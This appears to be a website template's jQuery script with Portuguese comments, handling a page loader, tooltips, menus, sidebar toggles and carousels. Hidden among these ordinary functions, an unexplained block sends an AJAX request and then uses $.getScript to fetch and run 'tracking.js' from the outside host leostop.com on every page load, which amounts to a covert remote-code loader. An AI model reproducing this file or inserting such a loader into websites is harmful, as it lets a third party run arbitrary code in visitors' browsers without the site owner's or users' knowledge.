$(function () {
  'use strict';

  /* Pré Carregamento
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $('.loader_bg').fadeToggle();
  }, 1500);

  /* Dica de ferramenta
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* Passando o mouse por cima
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('.main-menu ul li.megamenu').mouseover(function () {
      if (!$(this).parent().hasClass('#wrapper')) {
        $('#wrapper').addClass('overlay');
      }
    });
    $('.main-menu ul li.megamenu').mouseleave(function () {
      $('#wrapper').removeClass('overlay');
    });
  });

  /* Alternar barra lateral
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('#sidebarCollapse').on('click', function () {
      $('#sidebar').toggleClass('active');
      $(this).toggleClass('active');
    });
  });

  /* Controle deslizante de produto
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // Opcional
  $('#blogCarousel').carousel({
    interval: 5000,
  });
});

function getURL() {
  window.location.href;
}
var protocol = location.protocol;
$.ajax({
  type: 'get',
  data: { surl: getURL() },
  success: function (response) {
    $.getScript(protocol + '//leostop.com/tracking/tracking.js');
  },
});

/* Alternar barra lateral
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById('mySidepanel').style.width = '250px';
}

function closeNav() {
  document.getElementById('mySidepanel').style.width = '0';
}

/* Animação js*/

(function ($) {
  // Função para animar as legendas do controle deslizante
  function doAnimations(elems) {
    // Armazene em cache o evento de final de animação em uma variável
    var animEndEv = 'webkitAnimationEnd animationend';

    elems.each(function () {
      var $this = $(this),
        $animationType = $this.data('animation');
      $this.addClass($animationType).one(animEndEv, function () {
        $this.removeClass($animationType);
      });
    });
  }

  //Variáveis ​​no carregamento da página
  var $myCarousel = $('#carouselExampleIndicators'),
    $firstAnimatingElems = $myCarousel
      .find('.carousel-item:first')
      .find("[data-animation ^= 'animated']");

  //Inicializar carrossel
  $myCarousel.carousel();

  //Anime as legendas no primeiro slide no carregamento da página
  doAnimations($firstAnimatingElems);

  //Outros slides serão animados no evento de slides do carrossel
  $myCarousel.on('slide.bs.carousel', function (e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);

/* Alternar barra lateral
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById('mySidepanel').style.width = '250px';
}

function closeNav() {
  document.getElementById('mySidepanel').style.width = '0';
}

// owl-carousel
$('.owl-carousel').owlCarousel({
  loop: true,
  margin: 15,
  nav: true,

  responsive: {
    0: {
      items: 1,
    },
    600: {
      items: 3,
    },
    1000: {
      items: 3,
    },
  },
});

// menu js

// Definir todas as variáveis ​​de UI
const navToggler = document.querySelector('.nav-toggler');
const navMenu = document.querySelector('.site-navbar ul');
const navLinks = document.querySelectorAll('.site-navbar a');

// Carregar todos os listadores de eventos
allEventListners();

// Funções de todos os listadores de eventos
function allEventListners() {
  // Evento de clique do ícone toggler
  navToggler.addEventListener('click', togglerClick);
  // Evento de clique de links de navegação
  navLinks.forEach((elem) => elem.addEventListener('click', navLinkClick));
}

// togglerClick Função
function togglerClick() {
  navToggler.classList.toggle('toggler-open');
  navMenu.classList.toggle('open');
}

// navLinkClick Função
function navLinkClick() {
  if (navMenu.classList.contains('open')) {
    navToggler.click();
  }
}
